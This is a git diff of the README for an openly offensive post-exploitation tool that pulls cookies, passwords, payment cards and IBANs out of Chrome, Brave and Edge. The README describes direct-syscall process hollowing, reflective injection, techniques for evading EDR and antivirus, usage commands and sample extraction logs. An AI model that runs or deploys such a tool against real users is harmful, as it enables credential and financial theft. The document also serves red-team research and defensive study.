@@ -8,20 +8,20 @@
 ![Languages](https://img.shields.io/badge/code-C%2B%2B%20%7C%20ASM-9cf)
 [![Ask DeepWiki](https://deepwiki.com/badge.svg)](https://deepwiki.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
 
-A post-exploitation tool demonstrating a complete, in-memory bypass of Chromium's **App-Bound Encryption (ABE)**. This project utilizes **Direct Syscall-based Reflective Process Hollowing** to launch a legitimate browser process in a suspended state, stealthily injecting a payload to hijack its identity and security context. This **Living-off-the-Land (LOTL)** technique that subverts the browser's own security model. The fileless approach allows the tool to operate entirely from memory, bypassing user-land API hooks to decrypt and exfiltrate sensitive user data (cookies, passwords, payments) from modern Chromium browsers.
+A post-exploitation tool demonstrating a complete, in-memory bypass of Chromium's **App-Bound Encryption (ABE)**. This project utilizes **Direct Syscall-based Reflective Process Hollowing** to launch a legitimate browser process in a suspended state, stealthily injecting a payload to hijack its identity and security context. This **Living-off-the-Land (LOTL)** technique subverts the browser's own security model. The fileless approach allows the tool to operate entirely from memory, bypassing user-land API hooks to decrypt and exfiltrate sensitive user data (cookies, passwords, payments) from modern Chromium browsers.
 
-If you find this research valuable, I’d appreciate a coffee:  
+If you find this research valuable, I'd appreciate a coffee:  
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/M4M61EP5XL)
 
 ## 🛡️ Core Technical Pillars
 
 This tool's effectiveness is rooted in a combination of modern, evasion-focused techniques:
 
-- **Direct Syscalls for Evasion:** Bypasses EDR/AV user-land hooks on standard WinAPI functions by invoking kernel functions directly. The engine is robust and dynamically resolves syscall numbers at runtime, ensuring compatibility across Windows versions.
+- **Direct Syscalls for Evasion:** Bypasses EDR/AV user-land hooks on standard WinAPI functions by invoking kernel functions directly. The engine dynamically resolves syscall numbers at runtime using **Hell's Gate** technique with **hash-based function matching** (no plaintext syscall names in the binary).
 
 - **Direct Syscall-Based Process Hollowing:** A stealthy process creation and injection technique. Instead of injecting into a high-traffic, potentially monitored process, it creates a new, suspended host process. This significantly reduces the chances of detection, as all memory manipulations occur before the process begins normal execution.
 
-- **Fileless In-Memory Payload:** The payload DLL never touches the disk on the target machine. It is stored encrypted within the injector, decrypted in-memory, and reflectively loaded, minimizing its forensic footprint and bypassing static file-based scanners.
+- **Fileless In-Memory Payload:** The payload DLL never touches the disk on the target machine. It is stored encrypted within the injector using **ChaCha20** with **compile-time derived keys**, decrypted in-memory, and reflectively loaded, minimizing its forensic footprint and bypassing static file-based scanners.
 
 - **Reflective DLL Injection (RDI):** A stealthy process injection method that circumvents `LoadLibrary`, thereby evading detection mechanisms that monitor module loads. The self-contained C loader resolves all of its own dependencies from memory.
 
@@ -34,13 +34,15 @@ This tool's effectiveness is rooted in a combination of modern, evasion-focused 
 - 🔓 Full user-mode decryption of cookies, passwords, payment methods, and IBANs.
 - 📁 Discovers and processes all user profiles (Default, Profile 1, etc.).
 - 📝 Exports all extracted data into structured JSON files, organized by profile.
-- 🔍 Browser Fingerprinting of browser metadata and system information.
+- 🔍 Comprehensive browser fingerprinting with system information.
 
 ### Stealth & Evasion
 
 - 🛡️ **Fileless Payload Delivery:** In-memory decryption and injection of an encrypted resource.
 - 🛡️ **Direct Syscall Engine:** Bypasses common endpoint defenses by avoiding hooked user-land APIs for all process operations.
-- 🛡️ **Syscall Obfuscation:** Runtime XOR encryption of syscall table in memory to evade detection by security tools.
+- 🛡️ **Hash-Based Syscall Resolution:** No plaintext `Nt*`/`Zw*` function names in binary—uses compile-time DJB2 hashes.
+- 🛡️ **Compile-Time Key Derivation:** Encryption keys derived from build metadata, unique per build.
+- 🛡️ **PE Header Destruction:** Post-injection PE headers obliterated with pseudo-random data to evade memory scanners.
 - 🛡️ **IPC Mimicry:** Browser-specific named pipe patterns that blend with legitimate browser IPC traffic.
 - 🤫 **Process Hollowing:** Creates a benign, suspended host process for the payload, avoiding injection into potentially monitored processes.
 - 👻 **Reflective DLL Injection:** Stealthily loads the payload without suspicious `LoadLibrary` calls.
@@ -59,11 +61,11 @@ This tool's effectiveness is rooted in a combination of modern, evasion-focused 
 
 ## 📦 Supported & Tested Versions
 
-| Browser            | Tested Version (x64 & ARM64) |
+| Browser            | Tested Version (x64 & ARM64) |
 | ------------------ | ---------------------------- |
-| **Google Chrome**  | 142.0.7444.60                |
-| **Brave**          | 1.84.132 (142.0.7444.60)     |
-| **Microsoft Edge** | 142.0.3595.53                |
+| **Google Chrome**  | 143.0.7499.170               |
+| **Brave**          | 1.85.118 (143.0.7499.169)    |
+| **Microsoft Edge** | 144.0.3719.35                |
 
 ## 🔍 Feature Support Matrix
 
@@ -72,7 +74,7 @@ This matrix outlines the extraction capabilities for each supported browser.
 | Feature              | Google Chrome          | Brave                  | Microsoft Edge                          |
 |----------------------|------------------------|------------------------|-----------------------------------------|
 | **Cookies**         | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
-| **Passwords**       | ✅ ABE                | ✅ ABE                | ⚠️ DPAPI v10 (ABE not yet implemented) |
+| **Passwords**       | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
 | **Payment Methods** | ✅ ABE                | ✅ ABE                | ✅ ABE                                 |
 | **IBANs**           | ✅ ABE                | ✅ ABE                | ❌ Not existing                        |
 
@@ -87,19 +89,25 @@ The tool's execution is focused on stealth and efficiency, built around a **Dire
 
 ### **Stage 1: The Injector (`chromelevator.exe`)**
 
-1.  **Pre-Flight & Initialization:** The injector begins by initializing its **direct syscall engine**, dynamically parsing `ntdll.dll` to resolve syscall numbers (SSNs) and locate kernel transition gadgets (`syscall/ret` or `svc/ret`). It then performs a critical pre-flight check, using `NtGetNextProcess` and other syscalls to find and terminate any browser "network service" child processes. This preemptively releases file locks on the target SQLite databases.
-2.  **Payload Preparation:** The core payload DLL, which is stored as a **ChaCha20-encrypted resource**, is loaded and decrypted entirely in-memory.
+1.  **Pre-Flight & Initialization:** The injector begins by initializing its **direct syscall engine**, dynamically parsing `ntdll.dll` to resolve syscall numbers (SSNs) using hash-based matching and locate kernel transition gadgets (`syscall/ret` or `svc/ret`). It then performs a critical pre-flight check, using `NtGetNextProcess` and other syscalls to find and terminate any browser "network service" child processes. This preemptively releases file locks on the target SQLite databases.
+2.  **Payload Preparation:** The core payload DLL, which is stored as a **ChaCha20-encrypted resource** with compile-time derived keys, is loaded and decrypted entirely in-memory.
 3.  **Process Hollowing:** Instead of targeting an existing process, the injector creates a new instance of the target browser in a **`CREATE_SUSPENDED`** state (`CreateProcessW`). This pristine, suspended process serves as the host for our payload.
 4.  **Reflective Injection via Syscalls:** Using the direct syscall engine, the injector performs a series of stealthy actions on the suspended process:
-    - It allocates memory using `NtAllocateVirtualMemory`.
+    - It allocates memory using `NtAllocateVirtualMemory` (direct syscall).
     - It writes the decrypted payload DLL into the allocated space with `NtWriteVirtualMemory`.
-    - It changes the memory region's permissions to executable using `NtProtectVirtualMemory`.
+    - It changes the memory region's permissions to executable using `NtProtectVirtualMemory` (direct syscall).
     - It creates a **named pipe** for communication and writes the pipe's name into the target's memory.
-5.  **Execution & Control:** A new thread is created in the target process using `NtCreateThreadEx`. The thread's start address points directly to the payload's `ReflectiveLoader` export, with the address of the remote pipe name as its argument. The original main thread of the browser remains suspended and is never resumed. The injector then waits for the payload to connect back to the pipe.
+5.  **Execution & Control:** A new thread is created in the target process using `NtCreateThreadEx`. The thread's start address points directly to the payload's `Bootstrap` export, with the address of the remote pipe name as its argument. The original main thread of the browser remains suspended and is never resumed. The injector then waits for the payload to connect back to the pipe.
 
 ### **Stage 2: The Injected Payload (In-Memory)**
 
-1.  **Bootstrapping:** The `ReflectiveLoader` stub executes, functioning as a custom in-memory PE loader. It correctly maps the DLL's sections, performs base relocations, and resolves its Import Address Table (IAT) by parsing the PEB and hashing function names. Finally, it invokes the payload's `DllMain`.
+1.  **Bootstrapping:** The `Bootstrap` reflective loader executes, functioning as a custom in-memory PE loader with enhanced stealth:
+    - Allocates new memory for the payload using **direct syscalls** to `NtAllocateVirtualMemory` (bypassing hooked `VirtualAlloc`).
+    - Correctly maps the DLL's sections and performs base relocations.
+    - Resolves its Import Address Table (IAT) by parsing the PEB and hashing function names.
+    - Sets section permissions using **direct syscalls** to `NtProtectVirtualMemory`.
+    - **Destroys PE headers** by overwriting DOS/NT headers with pseudo-random data, eliminating MZ signature from memory.
+    - Finally, invokes the payload's `DllMain`.
 2.  **Connection & Setup:** The `DllMain` spawns a new thread that immediately connects to the named pipe handle passed by the injector. It reads the configuration, including the output path, sent by the injector. All subsequent logs and status updates are relayed back through this pipe.
 3.  **Target-Context COM Hijack:** Now running natively within the browser process, the payload instantiates the browser's internal `IOriginalBaseElevator` or `IEdgeElevatorFinal` COM server. As the call originates from a trusted process path, all of the server's security checks are passed.
 4.  **Master Key Decryption:** The payload calls the `DecryptData` method on the COM interface, providing the `app_bound_encrypted_key` it reads from the `Local State` file. The COM server dutifully decrypts the key and returns the plaintext AES-256 master key to the payload.
@@ -116,9 +124,15 @@ This project uses a simple, robust build script that handles all compilation and
 
 3. Run the build script `make.bat` from the project root.
 
+**Build Options:**
+- `make.bat` - Full build (default)
+- `make.bat clean` - Remove all build artifacts
+- `make.bat build_encryptor_only` - Build only the encryptor (used by CI)
+- `make.bat build_target_only` - Build payload and injector (used by CI)
+
 ### Automated Builds with GitHub Actions
 
-This project uses GitHub Actions to automatically builds the injector executable (`chromelevator.exe`) for both **x64** and **ARM64** architectures
+This project uses GitHub Actions to automatically build the injector executable (`chromelevator.exe`) for both **x64** and **ARM64** architectures.
 
 You can find the latest pre-compiled binaries on the [**Releases page**](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases). The executables for both architectures are packaged together in a single, convenient .zip file.
 
@@ -130,31 +144,23 @@ You can find the latest pre-compiled binaries on the [**Releases page**](https:/
 ## 🚀 Usage
 
 ```bash
-PS> .\chromelevator.exe
+PS> .\chromelevator.exe --help
+
 _________ .__                         ___________.__                       __
 \_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
 /    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
 \     \___|   Y  \  | \(  <_> )  Y Y  \|        \|  |_\  ___/\   /  / __ \|  | (  <_> )  | \/
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
-
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.16.0 by @xaitax
+ x64 & ARM64 | v0.17.0 by @xaitax
 
-Usage:
-  chrome_inject.exe [options] <chrome|brave|edge|all>
+  Usage: chromelevator.exe [options] <chrome|edge|brave|all>
 
-Options:
-  --output-path|-o <path>  Directory for output files (default: .\output\)
-  --verbose|-v             Enable verbose debug output from the injector
-  --fingerprint|-f         Extract browser fingerprinting data
-  --help|-h                Show this help message
-
-Browser targets:
-  chrome  - Extract from Google Chrome
-  brave   - Extract from Brave Browser
-  edge    - Extract from Microsoft Edge
-  all     - Extract from all installed browsers
+  Options:
+    -v, --verbose      Show detailed output
+    -f, --fingerprint  Extract browser fingerprint
+    -o, --output-path  Custom output directory
 ```
 
 ### Options
@@ -174,7 +180,7 @@ Browser targets:
 - `--help` or `-h`
   Show this help message.
 
-#### Normal Run
+### Normal Run
 
 ```bash
 PS> .\chromelevator.exe all
@@ -184,99 +190,110 @@ _________ .__                         ___________.__                       __
 \     \___|   Y  \  | \(  <_> )  Y Y  \|        \|  |_\  ___/\   /  / __ \|  | (  <_> )  | \/
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
-
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.16.1 by @xaitax
+ x64 & ARM64 | v0.17.0 by @xaitax
 
-[*] Processing 3 browser(s):
+  ┌──── Brave ──────────────────────────────────────
+  │
+  │ Decryption Key
+  │ 2522A3C1730EA8EE84BAAD1994DB31E20437D9DCF27628997598BB5B86F73DCD
+  │
+  ├── Default
+  │   Cookies     2446/2467
+  │   Passwords   46
+  │   Cards       1
+  │   IBANs       1
+  │
+  └── 2446 cookies, 46 passwords, 1 cards, 1 IBANs (1 profile)
+      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave
 
-[*] Chrome
-[+] AES Key: 3fa14dc988a34c85bdb872159b739634cb7e56f8e34449c1494297b9b629d094
-[+] Extracted 481 cookies, 2 passwords and 1 payments from 2 profiles
-[+] Stored in C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
+  ┌──── Chrome ──────────────────────────────────────
+  │
+  │ Decryption Key
+  │ 3FA14DC988A34C85BDB872159B739634CB7E56F8E34449C1494297B9B629D094
+  │
+  ├── Default
+  │   Cookies     378/382
+  │   Passwords   1
+  │
+  ├── Profile 1
+  │   Cookies     768/773
+  │   Passwords   2
+  │   Cards       1
+  │   IBANs       1
+  │
+  └── 1146 cookies, 3 passwords, 1 cards, 1 IBANs (2 profiles)
+      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
 
-[*] Edge
-[+] AES Key: b0334fad7f5805362cb4c44b144a95ab7a68f7346ef99eb3f175f09db08c8fd9
-[+] Extracted 203 cookies and 2 passwords from 2 profiles
-[+] Stored in C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Edge
-
-[*] Brave
-[+] AES Key: 5f5b1c8112fba445332a9b01a59349f1112426753bfee2c5908aab6c46982fcd
-[+] Extracted 2484 cookies, 1028 passwords and 1 payments from 1 profile
-[+] Stored in C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Brave
-
-[*] Completed: 3 successful, 0 failed
+  ┌──── Edge ──────────────────────────────────────
+  │
+  │ Decryption Key
+  │ B0334FAD7F5805362CB4C44B144A95AB7A68F7346EF99EB3F175F09DB08C8FD9
+  │
+  ├── Default
+  │   Cookies     220/222
+  │   Passwords   2
+  │   Cards       1
+  │
+  ├── Profile 1
+  │   Cookies     42
+  │
+  └── 262 cookies, 2 passwords, 1 cards (2 profiles)
+      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Edge
 ```
 
-#### Verbose
+### Verbose
 
 ```bash
-PS> .\chromelevator.exe chrome -v -f
+PS> .\chromelevator.exe -v -f chrome
+
 _________ .__                         ___________.__                       __
 \_   ___ \|  |_________  ____   _____ \_   _____/|  |   _______  _______ _/  |_  ___________
 /    \  \/|  |  \_  __ \/  _ \ /     \ |    __)_ |  | _/ __ \  \/ /\__  \\   __\/  _ \_  __ \
 \     \___|   Y  \  | \(  <_> )  Y Y  \|        \|  |_\  ___/\   /  / __ \|  | (  <_> )  | \/
  \______  /___|  /__|   \____/|__|_|  /_______  /|____/\___  >\_/  (____  /__|  \____/|__|
         \/     \/                   \/        \/           \/           \/
-
  Direct Syscall-Based Reflective Hollowing
- x64 & ARM64 | v0.16.1 by @xaitax
+ x64 & ARM64 | v0.17.0 by @xaitax
 
-[#] Found and sorted 489 Zw* functions.
-[#] Initialized 19 syscall stubs (with obfuscation).
-[#] Obfuscation layer active - syscalls encrypted in memory
-[#] Searching Registry for: chrome.exe
-[#] Found at: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] Scanning for and terminating browser network services...
-[#] Creating suspended Chrome process.
-[#] Target executable path: C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] Created suspended process PID: 6088
-[#] Architecture match: Injector=ARM64, Target=ARM64
-[#] Named pipe server created: \\.\pipe\chrome.nacl.3150_4B01
-[#] Loading and decrypting payload DLL.
-[#] Parsing payload PE headers for ReflectiveLoader.
-[#] ReflectiveLoader found at file offset: 0x14fb0
-[#] Allocating memory for payload in target process.
-[#] Combined memory for payload and parameters allocated at: 0x2d6fec10000
-[#] Writing payload DLL to target process.
-[#] Writing pipe name parameter into the same allocation.
-[#] Changing payload memory protection to executable.
-[#] Creating new thread in target to execute ReflectiveLoader.
-[#] Successfully created new thread for payload.
-[#] New thread created for payload. Main thread remains suspended.
-[#] Waiting for payload to connect to named pipe.
-[#] Payload connected to named pipe.
-[#] Sent message to pipe: VERBOSE_TRUE
-[#] Sent message to pipe: FINGERPRINT_TRUE
-[#] Sent message to pipe: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output
-[#] Waiting for payload execution. (Pipe: \\.\pipe\chrome.nacl.3150_4B01)
-
-[*] Decryption process started for Chrome
-[+] COM library initialized (APARTMENTTHREADED).
-[*] Reading Local State file: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[*] Attempting to decrypt master key via Chrome's COM server...
-[+] Decrypted AES Key: 3fa14dc988a34c85bdb872159b739634cb7e56f8e34449c1494297b9b629d094
-[*] Discovering browser profiles in: C:\Users\ah\AppData\Local\Google\Chrome\User Data
-[+] Found 2 profile(s).
-[*] Processing profile: Default
-     [*] 378 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\cookies.json
-     [*] 1 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Default\passwords.json
-[*] Processing profile: Profile 1
-     [*] 622 cookies extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\cookies.json
-     [*] 2 passwords extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\passwords.json
-     [*] 1 payments extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\payments.json
-     [*] 1 iban extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\Profile 1\iban.json
-[*] Extraction complete: 2 successful, 0 failed.
-[*] Extracting browser fingerprint data...
-[*] Discovering browser profiles in: C:\Users\ah\AppData\Local\Google\Chrome\User Data
-[+] Found 2 profile(s).
-[+] Browser fingerprint extracted to C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome\fingerprint.json
-[#] Payload completion signal received.
-
-[#] Payload signaled completion or pipe interaction ended.
-[#] Terminating browser PID=6088 via direct syscall.
-[#] Chrome terminated by injector.
-[+] Extraction completed successfully
+  ┌──── Chrome ──────────────────────────────────────
+  │ Terminating browser network services...
+  │   [+] Network services terminated
+  │ Creating suspended process: C:\Program Files\Google\Chrome\Application\chrome.exe
+  │   [+] Process created (PID: 25184)
+  │   [+] IPC pipe established: \\.\pipe\chrome.nacl.20027_76C4
+  │ Deriving runtime decryption keys...
+  │   [+] Payload decrypted (1044 KB)
+  │   [+] Bootstrap entry point resolved (offset: 0x2a690)
+  │ Allocating memory in target process via syscall...
+  │   [+] Memory allocated at 0x1c2dec60000 (1048 KB)
+  │   [+] Payload + parameters written
+  │   [+] Memory protection set to PAGE_EXECUTE_READ
+  │ Creating remote thread via syscall...
+  │   [+] Thread created (entry: 0x1c2dec8a690)
+  │ Awaiting payload connection...
+  │   [+] Payload connected
+  │ Running in Chrome
+  │
+  │ Decryption Key
+  │ 3FA14DC988A34C85BDB872159B739634CB7E56F8E34449C1494297B9B629D094
+  │
+  ├── Default
+  │   Size        13 MB
+  │   Cookies     378/382
+  │   Passwords   1
+  │
+  ├── Profile 1
+  │   Size        610 MB
+  │   Cookies     768/773
+  │   Passwords   2
+  │   Cards       1
+  │   IBANs       1
+  │ Extracting comprehensive fingerprint...
+  │ Fingerprint saved to fingerprint.json
+  │
+  └── 1146 cookies, 3 passwords, 1 cards, 1 IBANs (2 profiles)
+      C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\output\Chrome
 ```
 
 ## 📂 Data Extraction
@@ -286,7 +303,7 @@ Once decryption completes, data is saved to the specified output path (defaultin
 **Base Path:** `YOUR_CHOSEN_PATH` (e.g., `.\output\` or the path you provide)
 **Structure:** <Base Path>/<BrowserName>/<ProfileName>/<data_type>.json
 
-Example paths (assuming default output location):\*\*
+Example paths (assuming default output location):
 
 - 🍪 **Cookies (Chrome Default profile):** .\output\Chrome\Default\cookies.json
 - 🔑 **Passwords (Edge Profile 1):** .\output\Edge\Profile 1\passwords.json
@@ -320,15 +337,10 @@ Each password file is a JSON array of objects:
 ```json
 [
   {
-    "origin": "https://example.com/login",
-    "username": "user@example.com",
-    "password": "••••••••••"
+    "url": "https://example.com/login",
+    "user": "user@example.com",
+    "pass": "••••••••••"
   },
-  {
-    "origin": "https://another.example.com",
-    "username": "another_user",
-    "password": "••••••••••"
-  }
   …
 ]
 ```
@@ -340,19 +352,12 @@ Each payment file is a JSON array of objects:
 ```json
 [
   {
-    "name_on_card": "John Doe",
-    "expiration_month": 12,
-    "expiration_year": 2030,
-    "card_number": "••••••••••1234",
+    "name": "John Doe",
+    "month": 12,
+    "year": 2030,
+    "number": "••••••••••1234",
     "cvc": "•••"
   },
-  {
-    "name_on_card": "Jane Smith",
-    "expiration_month": 07,
-    "expiration_year": 2028,
-    "card_number": "••••••••••5678",
-    "cvc": "•••"
-  }
   …
 ]
 ```
@@ -365,36 +370,42 @@ Each IBAN file is a JSON array of objects:
 [
   {
     "nickname": "UK Test",
-    "value": "GB33BUKB20201555555555"
+    "iban": "GB33BUKB20201555555555"
   }
 ]
 ```
 
 ### 🔍 Browser Fingerprinting 
 
-When using the `--fingerprint` flag, a comprehensive metadata report is generated:
+When using the `--fingerprint` or `-f` flag, a comprehensive metadata report is generated:
 
 ```json
 {
-  "browser": "Brave",
-  "browser_version": "141.1.83.109",
-  "executable_path": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
-  "user_data_path": "C:\\Users\\username\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
+  "browser": "Chrome",
+  "executable_path": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+  "browser_version": "143.0.7499.170",
+  "user_data_path": "C:\\Users\\username\\AppData\\Local\\Google\\Chrome\\User Data",
   "sync_enabled": false,
-  "enterprise_managed": false,
+  "enterprise_managed": true,
   "update_channel": "stable",
-  "default_search_engine": "Google",
-  "hardware_acceleration": true,
+  "hardware_acceleration": false,
+  "metrics_enabled": false,
   "autofill_enabled": true,
-  "password_manager_enabled": true,
+  "password_manager_enabled": false,
   "safe_browsing_enabled": true,
-  "installed_extensions_count": 12,
-  "extension_ids": ["abc123...", "def456...", ...],
-  "profile_count": 1,
+  "do_not_track": false,
+  "third_party_cookies_blocked": false,
+  "translate_enabled": true,
+  "installed_extensions_count": 2,
+  "extension_ids": ["ghbmnnjooekpmoecnnnilnnbdlolhkhi", "nmmhkkegccagdldgiimedpiccmgmieda"],
+  "profile_count": 2,
   "computer_name": "DESKTOP-ABC123",
   "windows_user": "username",
-  "last_config_update": 1759127932,
-  "extraction_timestamp": 1759213456
+  "os_version": "10.0.26220",
+  "architecture": "ARM64",
+  "last_config_update": 1766578854,
+  "extraction_timestamp": 1766591611,
+  "extraction_complete": true
 }
 ```
 
